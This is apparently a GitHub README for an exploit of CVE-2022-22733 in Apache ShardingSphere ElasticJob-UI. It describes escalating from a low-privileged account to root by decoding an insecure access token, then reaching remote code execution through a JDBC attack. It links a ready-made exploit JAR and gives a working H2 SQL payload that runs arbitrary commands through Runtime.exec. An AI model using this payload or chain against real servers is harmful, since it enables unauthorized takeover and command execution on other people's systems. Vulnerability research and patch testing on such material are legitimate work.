# CVE-2022-22733


CVE-2022-22733 is a vulnerabilit that affects Apache ShardingSphere ElasticJob-UI 3.0.0 and below versions, The vulnerability lead to Privilege Escalation. But, with abusing of the escalated privileges a `JDBC` Attack it can preformed & achieve RCE. You can read the vulnerability analysis from [Here](https://www.vicarius.io/vsociety/blog/cve-2022-22733-apache-shardingsphere-elasticjob-ui-privilege-escalation) & The exploit writing blog step by step from [Here](https://www.vicarius.io/vsociety/blog/unique-exploit-cve-2022-22733-privilege-escalation-and-rce).

![elasticjob](https://user-images.githubusercontent.com/62406753/234271377-56e490ad-b70c-4c33-9423-e18656489b18.png)

The Exploit Works as the following:
- Login with the low-privileged account.
- Obtain the unsecure generated `accessToken`.
- Decode the unsecure generated `accessToken`.
- Parse the decoded data from the `accessToken`.
- Retrive `root` account credentials from the parsed data.
- Login with the `root` account credentials and obtain a full privileges on the application.
- Send a Connection Test request with abusing of the``JDBC` Attack.

# Usage
You can download `JAR` file from [here](https://github.com/Zeyad-Azima/CVE-2022-22733/releases/tag/CVE-2022-22733) & Source code [here](https://github.com/Zeyad-Azima/CVE-2022-22733/blob/main/src/Main.java).

- Execute `jar`:
```
java -jar CVE-2022-22733.jar
```
- SQL script code:
```
CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "123";}';CALL EXEC ('your_command_here')
```
# Demo
![idea64_5Ru1DeWcKE](https://user-images.githubusercontent.com/62406753/234266805-e387ffbe-b347-4176-9891-77168604c8f1.gif)
